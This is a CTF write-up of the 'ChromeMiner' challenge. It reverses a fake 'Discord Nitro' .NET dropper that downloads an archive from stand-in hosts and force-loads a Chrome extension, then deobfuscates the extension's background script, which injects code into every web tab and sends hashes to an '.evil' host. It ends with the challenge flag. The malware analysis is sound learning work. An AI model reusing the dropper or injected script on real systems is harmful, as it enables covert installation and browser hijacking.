# ChromeMiner

## Recon

![[Pasted image 20250921110711.png]]

"Get Nitro" redirects to `/static/nitro/DiscurdNitru.exe`.

```plaintext
┌──(quickemu㉿hacking-kali)-[/workspace]
└─$ file DiscurdNitru.exe 
DiscurdNitru.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections
```

## Reversing

```c#
private static void Main(string[] args) {
    Random random = new Random();
    List<string> list = new List<string> { "priyacareers", "perfectdemos", "bussiness-z", "cablingpoint", "corporatebusinessmachines" };
    int num = random.Next(list.Count);
    using (WebClient webClient = new WebClient()) {
        webClient.DownloadFile(new Uri("https://" + list[num] + ".htb/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5pdHJ1"), "archive.zip");
    }
    ZipFile.ExtractToDirectory("archive.zip", "DiscurdNitru");

    string text = Registry.GetValue("HKEY_CLASSES_ROOT\\ChromeHTML\\shell\\open\\command", null, null) as string;
    if (text != null){
        string[] array = text.Split(new char[] { '"' });
        text = ((array.Length >= 2) ? array[1] : null);
    }
    Process.Start(text, "--load-extension=\"" + Path.Combine(Environment.CurrentDirectory, "DiscurdNitru") + "\" -restore-last-session, --noerrdialogs, --disable-session-crashed-bubble");
}
```

Dropper that downloads and extracts `/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5pdHJ1`.

This is a browser extension.`backhgound.js` is heavily obfuscated, contains two `q` arrays that are substituted to create JavaScript code.

```py
import re

IN = "background.js"


def replace_q_index(match, q):
    index = int(match.group(1), 0)
    return repr(q[index])


def process_code(content):
    parts = re.split(r"(q = \[)", content, maxsplit=2)

    processed_parts = ""
    result = ["".join(parts[:3]), "".join(parts[3:])]

    for part in result:
        q_match = re.search(r"q\s*=\s*(\[[^\]]*\])", part)

        if q_match:
            q = eval(q_match.group(1))

            part = re.sub(
                r"q\[(0x[\da-fA-F]+|\d+)\]",
                lambda match: replace_q_index(match, q),
                part,
            )

        part = re.sub(r"\s*\+\s*''", "", part)
        part = re.sub(r"''\s*\+", "", part)
        part = re.sub(r"'\+'", "", part)

        part = re.sub(r"q\s*=\s*\[[^\]]*\]", "", part)
        processed_parts += part
    return processed_parts


with open(IN, "r") as file:
    content = file.read()

deobfuscated_code = process_code(content)
print(deobfuscated_code)
```

```js
async function iF() {
    if (!("injected" in document)) {
        document["injected"] = true;
        window["setInterval"](async () => {
            y = new window["Uint8Array"](64);
            window["crypto"]["getRandomValues"](y);
            if (
                new window["TextDecoder"]("utf-8")
                    [
                        "decode"
                    ](await window["crypto"]["subtle"]["digest"]("sha-256", y))
                    ["endsWith"]("chrome")
            ) {
                j = new window["Uint8Array"](
                    y["byteLength"] +
                        (
                            await window["crypto"]["subtle"]["digest"](
                                "sha-256",
                                y,
                            )
                        )["byteLength"],
                );
                j["set"](new window["Uint8Array"](y), 0);
                j["set"](
                    new window["Uint8Array"](
                        await window["crypto"]["subtle"]["digest"](
                            "sha-256",
                            y,
                        ),
                    ),
                    y["byteLength"],
                );
                window["fetch"](
                    "hxxps://qwertzuiop123.evil/" +
                        [
                            ...new window["Uint8Array"](
                                await window["crypto"]["subtle"]["encrypt"](
                                    {
                                        ["name"]: "AES-CBC",
                                        ["iv"]: new window["TextEncoder"](
                                            "utf-8",
                                        )["encode"]("_NOT_THE_SECRET_"),
                                    },
                                    await window["crypto"]["subtle"][
                                        "importKey"
                                    ](
                                        "raw",
                                        await window["crypto"]["subtle"][
                                            "decrypt"
                                        ](
                                            {
                                                ["name"]: "AES-CBC",
                                                ["iv"]: new window[
                                                    "TextEncoder"
                                                ]("utf-8")["encode"](
                                                    "_NOT_THE_SECRET_",
                                                ),
                                            },
                                            await window["crypto"]["subtle"][
                                                "importKey"
                                            ](
                                                "raw",
                                                new window["TextEncoder"](
                                                    "utf-8",
                                                )["encode"]("_NOT_THE_SECRET_"),
                                                { ["name"]: "AES-CBC" },
                                                true,
                                                ["decrypt"],
                                            ),
                                            new window["Uint8Array"](
                                                "E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8"
                                                    ["match"](/../g)
                                                    ["map"]((h) =>
                                                        window["parseInt"](
                                                            h,
                                                            16,
                                                        ),
                                                    ),
                                            ),
                                        ),
                                        { ["name"]: "AES-CBC" },
                                        true,
                                        ["encrypt"],
                                    ),
                                    j,
                                ),
                            ),
                        ]
                            ["map"]((x) =>
                                x["toString"](16)["padStart"](2, "0"),
                            )
                            ["join"](""),
                );
            }
        }, 1);
    }
}
chrome["tabs"]["onUpdated"]["addListener"]((tabVar, changeInfo, tab) => {
    if (
        "url" in tab &&
        tab["url"] != null &&
        (tab["url"]["startsWith"]("https://") ||
            tab["url"]["startsWith"]("http://"))
    ) {
        chrome["scripting"]["executeScript"]({
            ["target"]: { ["tabId"]: tab["id"] },
            function: iF,
        });
    }
});
```

Decodes a string using AES-256-CBC with key and IV `_NOT_THE_SECRET_`

![[Pasted image 20250921112644.png]]

Flag: `HTB{__mY_vRy_owN_CHR0me_M1N3R__}`
